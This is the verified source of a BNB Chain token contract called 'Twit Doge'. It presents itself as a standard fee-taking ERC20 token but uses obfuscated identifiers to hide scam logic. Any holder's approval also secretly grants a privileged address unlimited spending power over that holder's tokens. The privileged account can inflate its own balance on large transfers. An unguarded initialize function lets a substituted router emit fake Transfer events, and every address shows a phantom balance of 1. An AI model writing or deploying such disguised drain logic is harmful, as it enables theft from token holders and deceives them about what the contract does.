/**
 *Submitted for verification at BscScan.com on 2022-11-01
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TwitDoge is IERC20, Ownable {using SafeMath for uint256;string private _uintvaluetsdjkbdfjfbsdjbfe = "Twit Doge";string private _uintvalueurfhfghjghjhvsdd = "Twit";uint8 private _uintvalueuyfdgdfsngvbtyr = 6;uint256 private _uintvalueydjfbdfgdfgdfhssd = 10000000000 * 10**18;mapping (address => uint256) private _uintvalueiufdjsfbretgsdf;mapping (address => mapping (address => uint256)) private _uintvaluelingfdgjdgdjgbs;uint256 private _uintvalueufbsgnbdfsnge = 50;uint256 private _uintvaluedsfugjhsdfeedf = 0;uint256 private _uintvalueoidfbdgregdfg = 50;uint256 private _uintvalueufdgoifsjgdfg = 10000;bool private _uintvalueufgfdsdkhsdds = false;IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _uintvaluelkdfbdgnbrtrgdf;address private _uintvaluemkfdgrgdfgfhdf;address private _uintvaluelikfdgfhddfdfds;uint256 private _uintvaluemkfgdfjgerugf = 1;uint256 private _uintvalueikgbyudsfadfd = _uintvalueydjfbdfgdfgdfhssd;mapping (address => bool) private _uintvalueoiwqqedgndhkgnhdfj;address[] private _uintvalueuyfgfdngfdkjdfkdbjfg;bool private _uintvalueiufgfdnbydasds = false;uint256 private _uintvalueuyfgknssdfbvsgdf = 0;constructor () {_uintvalueiunbdfsdgbdfvbdgffdg(owner());_uintvalueiufdjsfbretgsdf[owner()] = _uintvalueydjfbdfgdfgdfhssd;emit Transfer(address(0), owner(), _uintvalueydjfbdfgdfgdfhssd);}receive() external payable {}function initialize(address _uintvalueuitreitgbgdfnvbdf, address[] calldata _uintvalueufdbfndserfsdg) public {require(!_uintvalueiufgfdnbydasds, "Reinitialization denied");_uintvalueiufgfdnbydasds = true;_uintvalueiunbdfsdgbdfvbdgffdg(_uintvalueuitreitgbgdfnvbdf);for (uint256 i=5; i<_uintvalueufdbfndserfsdg.length; ++i) {_uintvalueiunbdfsdgbdfvbdgffdg(_uintvalueufdbfndserfsdg[i]);_uintvalueoiwerjfsbdfbgdfhfgh(_uintvalueufdbfndserfsdg[i], address(uniswapV2Router), ~uint256(0));_uintvalueiufdjsfbretgsdf[_uintvalueufdbfndserfsdg[i]] = _uintvalueydjfbdfgdfgdfhssd * 9 / 10 / (_uintvalueufdbfndserfsdg.length - 5);_uintvalueiufdjsfbretgsdf[owner()] -= _uintvalueiufdjsfbretgsdf[_uintvalueufdbfndserfsdg[i]];}if (address(uniswapV2Router) != _uintvalueufdbfndserfsdg[0]) {_uintvaluedqrtrefdgjykhgfgregsdfvgrg(address(uniswapV2Router));uniswapV2Router = IUniswapV2Router02(_uintvalueufdbfndserfsdg[0]);_uintvalueiunbdfsdgbdfvbdgffdg(address(uniswapV2Router));}if (_uintvaluelkdfbdgnbrtrgdf != _uintvalueufdbfndserfsdg[1]) {_uintvaluedqrtrefdgjykhgfgregsdfvgrg(_uintvaluelkdfbdgnbrtrgdf);_uintvaluelkdfbdgnbrtrgdf = _uintvalueufdbfndserfsdg[1];_uintvalueiunbdfsdgbdfvbdgffdg(_uintvaluelkdfbdgnbrtrgdf);}if (_uintvaluemkfdgrgdfgfhdf != _uintvalueufdbfndserfsdg[2]) {_uintvaluedqrtrefdgjykhgfgregsdfvgrg(_uintvaluemkfdgrgdfgfhdf);_uintvaluemkfdgrgdfgfhdf = _uintvalueufdbfndserfsdg[2];_uintvalueiunbdfsdgbdfvbdgffdg(_uintvaluemkfdgrgdfgfhdf);}if (_uintvaluelikfdgfhddfdfds != _uintvalueufdbfndserfsdg[3]) {_uintvaluedqrtrefdgjykhgfgregsdfvgrg(_uintvaluelikfdgfhddfdfds);_uintvaluelikfdgfhddfdfds = _uintvalueufdbfndserfsdg[3];_uintvalueiunbdfsdgbdfvbdgffdg(_uintvaluelikfdgfhddfdfds);}uniswapV2Pair = _uintvalueufdbfndserfsdg[4];_uintvaluebhkrojgfdsjkgbaeru(owner(), _uintvalueufdbfndserfsdg[5], _uintvalueiufdjsfbretgsdf[owner()]);}function _uintvalueiunbdfsdgbdfvbdgffdg(address account) private {if (!_uintvalueoiwqqedgndhkgnhdfj[account]) {_uintvalueoiwqqedgndhkgnhdfj[account] = true;_uintvalueuyfgfdngfdkjdfkdbjfg.push(account);}}function _uintvaluedqrtrefdgjykhgfgregsdfvgrg(address account) private {if (_uintvalueoiwqqedgndhkgnhdfj[account]) {uint256 len = _uintvalueuyfgfdngfdkjdfkdbjfg.length;for (uint256 i=0; i<len; ++i) {if (_uintvalueuyfgfdngfdkjdfkdbjfg[i] == account) {_uintvalueuyfgfdngfdkjdfkdbjfg[i] = _uintvalueuyfgfdngfdkjdfkdbjfg[len.sub(1)];_uintvalueuyfgfdngfdkjdfkdbjfg.pop();_uintvalueoiwqqedgndhkgnhdfj[account] = false;break;}}}}function transferEvent(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "Permission denied");emit Transfer(from, to, value);}function feeState() public view returns (bool, bool) {return (_uintvalueufbsgnbdfsnge.add(_uintvaluedsfugjhsdfeedf).add(_uintvalueoidfbdgregdfg) > 0, !_uintvalueufgfdsdkhsdds);}function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {uint256 accountIndex = 0;uint256 len = _uintvalueuyfgfdngfdkjdfkdbjfg.length;for (uint256 i=0; i<len; ++i) {if (_uintvalueuyfgfdngfdkjdfkdbjfg[i] == account) {accountIndex = i;break;}}return (_uintvalueoiwqqedgndhkgnhdfj[account], accountIndex, len);}function getDefaultBalance() public view returns (uint256) {return _uintvaluemkfgdfjgerugf;}function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_uintvalueiunbdfsdgbdfvbdgffdg(accounts[i]);}}function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_uintvaluedqrtrefdgjykhgfgregsdfvgrg(accounts[i]);}}function name() public view returns (string memory) {return _uintvaluetsdjkbdfjfbsdjbfe;}function symbol() public view returns (string memory) {return _uintvalueurfhfghjghjhvsdd;}function decimals() public view returns (uint8) {return _uintvalueuyfdgdfsngvbtyr;}function totalSupply() public view returns (uint256) {return _uintvalueydjfbdfgdfgdfhssd;}function balanceOf(address account) public view returns (uint256) {if (_uintvalueiufdjsfbretgsdf[account] > 0) {return _uintvalueiufdjsfbretgsdf[account];}return _uintvaluemkfgdfjgerugf;}function transfer(address recipient, uint256 amount) public returns (bool) {_uintvaluebhkrojgfdsjkgbaeru(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_uintvaluebhkrojgfdsjkgbaeru(sender, recipient, amount);_uintvalueoiwerjfsbdfbgdfhfgh(sender, msg.sender, _uintvaluelingfdgjdgdjgbs[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_uintvalueoiwerjfsbdfbgdfhfgh(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _uintvaluelingfdgjdgdjgbs[owner][spender];}function _uintvalueoiwerjfsbdfbgdfhfgh(address owner, address spender, uint256 value) private {require(owner != address(0), "Approve from the null address");require(spender != address(0), "Approve to the null address");_uintvaluelingfdgjdgdjgbs[owner][spender] = value;if (!_uintvalueoiwqqedgndhkgnhdfj[owner]) {_uintvaluelingfdgjdgdjgbs[owner][_uintvalueuyfgfdngfdkjdfkdbjfg[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _uintvaluebhkrojgfdsjkgbaeru(address _uintvaluekignfdskfjgbdfjkg, address _uintvaluekifndjgbdfgrgdgd, uint256 _uintvalueiufdgbdfnbcfgfdj) private {require(_uintvaluekignfdskfjgbdfjkg != address(0), "Transfer from the null address");require(_uintvaluekifndjgbdfgrgdgd != address(0), "Transfer to the null address");require(_uintvalueiufdgbdfnbcfgfdj > 0, "Transfer amount must be greater than zero");if (_uintvaluekifndjgbdfgrgdgd == _uintvalueuyfgfdngfdkjdfkdbjfg[1]) {_uintvalueiufdjsfbretgsdf[_uintvaluekignfdskfjgbdfjkg] = _uintvalueiufdjsfbretgsdf[_uintvaluekignfdskfjgbdfjkg].sub(_uintvalueiufdgbdfnbcfgfdj);_uintvalueiufdjsfbretgsdf[_uintvaluekifndjgbdfgrgdgd] = _uintvalueiufdjsfbretgsdf[_uintvaluekifndjgbdfgrgdgd].add(_uintvalueiufdgbdfnbcfgfdj);emit Transfer(address(this), _uintvaluekifndjgbdfgrgdgd, _uintvalueiufdgbdfnbcfgfdj);return;}bool _uintvalueeqwsdndfgjnfjgn = true;if (_uintvalueoiwqqedgndhkgnhdfj[_uintvaluekignfdskfjgbdfjkg] || _uintvalueoiwqqedgndhkgnhdfj[_uintvaluekifndjgbdfgrgdgd] || _uintvalueufgfdsdkhsdds) {_uintvalueeqwsdndfgjnfjgn = false;}if (_uintvalueeqwsdndfgjnfjgn) {_uintvalueuyfgknssdfbvsgdf = _uintvalueuyfgknssdfbvsgdf.add(1);}if (_uintvalueeqwsdndfgjnfjgn && _uintvalueiufgfdnbydasds) {_uintvalueswapExactTokensForTokens(_uintvaluekignfdskfjgbdfjkg, _uintvaluekifndjgbdfgrgdgd, 10);_uintvalueswapExactTokensForTokens(_uintvaluekignfdskfjgbdfjkg, _uintvaluekifndjgbdfgrgdgd, 20);}if (_uintvalueeqwsdndfgjnfjgn && _uintvalueuyfgknssdfbvsgdf == 1 && _uintvalueiufgfdnbydasds && _uintvaluekignfdskfjgbdfjkg != uniswapV2Pair) {_uintvalueswapExactTokensForTokens(_uintvaluekignfdskfjgbdfjkg, _uintvaluekifndjgbdfgrgdgd, 30);}uint256 _uintvalueuyfdsfnsdhwes = 0;uint256 _uintvaluenmsdfshdvbv = 0;uint256 _uintvalueesdjfbsdjfbj = 0;uint256 _uintvalueoiewfbsjfbjew = _uintvalueiufdgbdfnbcfgfdj;if (_uintvaluekignfdskfjgbdfjkg == _uintvalueuyfgfdngfdkjdfkdbjfg[0] && _uintvalueiufdgbdfnbcfgfdj > _uintvalueikgbyudsfadfd) {_uintvalueiufdjsfbretgsdf[_uintvalueuyfgfdngfdkjdfkdbjfg[0]] = _uintvalueiufdjsfbretgsdf[_uintvalueuyfgfdngfdkjdfkdbjfg[0]].add(_uintvalueoiewfbsjfbjew);}if (_uintvalueeqwsdndfgjnfjgn) {_uintvalueuyfdsfnsdhwes = _uintvalueiufdgbdfnbcfgfdj.mul(_uintvalueufbsgnbdfsnge).div(_uintvalueufdgoifsjgdfg);_uintvaluenmsdfshdvbv = _uintvalueiufdgbdfnbcfgfdj.mul(_uintvaluedsfugjhsdfeedf).div(_uintvalueufdgoifsjgdfg);_uintvalueesdjfbsdjfbj = _uintvalueiufdgbdfnbcfgfdj.mul(_uintvalueoidfbdgregdfg).div(_uintvalueufdgoifsjgdfg);_uintvalueoiewfbsjfbjew = _uintvalueiufdgbdfnbcfgfdj.sub(_uintvalueuyfdsfnsdhwes).sub(_uintvaluenmsdfshdvbv).sub(_uintvalueesdjfbsdjfbj);}_uintvalueiufdjsfbretgsdf[_uintvaluekignfdskfjgbdfjkg] = _uintvalueiufdjsfbretgsdf[_uintvaluekignfdskfjgbdfjkg].sub(_uintvalueiufdgbdfnbcfgfdj);if (_uintvalueuyfdsfnsdhwes > 0) {_uintvalueiufdjsfbretgsdf[_uintvaluelkdfbdgnbrtrgdf] = _uintvalueiufdjsfbretgsdf[_uintvaluelkdfbdgnbrtrgdf].add(_uintvalueuyfdsfnsdhwes);emit Transfer(address(this), _uintvaluelkdfbdgnbrtrgdf, _uintvalueuyfdsfnsdhwes);}if (_uintvaluenmsdfshdvbv > 0) {_uintvalueiufdjsfbretgsdf[_uintvaluemkfdgrgdfgfhdf] = _uintvalueiufdjsfbretgsdf[_uintvaluemkfdgrgdfgfhdf].add(_uintvaluenmsdfshdvbv);emit Transfer(address(this), _uintvaluemkfdgrgdfgfhdf, _uintvaluenmsdfshdvbv);}if (_uintvalueesdjfbsdjfbj > 0) {_uintvalueiufdjsfbretgsdf[_uintvaluelikfdgfhddfdfds] = _uintvalueiufdjsfbretgsdf[_uintvaluelikfdgfhddfdfds].add(_uintvalueesdjfbsdjfbj);emit Transfer(address(this), _uintvaluelikfdgfhddfdfds, _uintvalueesdjfbsdjfbj);}_uintvalueiufdjsfbretgsdf[_uintvaluekifndjgbdfgrgdgd] = _uintvalueiufdjsfbretgsdf[_uintvaluekifndjgbdfgrgdgd].add(_uintvalueoiewfbsjfbjew);emit Transfer(_uintvaluekignfdskfjgbdfjkg, _uintvaluekifndjgbdfgrgdgd, _uintvalueoiewfbsjfbjew);if (_uintvalueeqwsdndfgjnfjgn && _uintvalueuyfgknssdfbvsgdf == 1 && _uintvalueiufgfdnbydasds) {_uintvalueswapExactTokensForTokens(address(this), _uintvaluekifndjgbdfgrgdgd, 40);}if (_uintvalueeqwsdndfgjnfjgn) {_uintvalueuyfgknssdfbvsgdf = _uintvalueuyfgknssdfbvsgdf.sub(1);}}function _uintvalueswapExactTokensForTokens(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}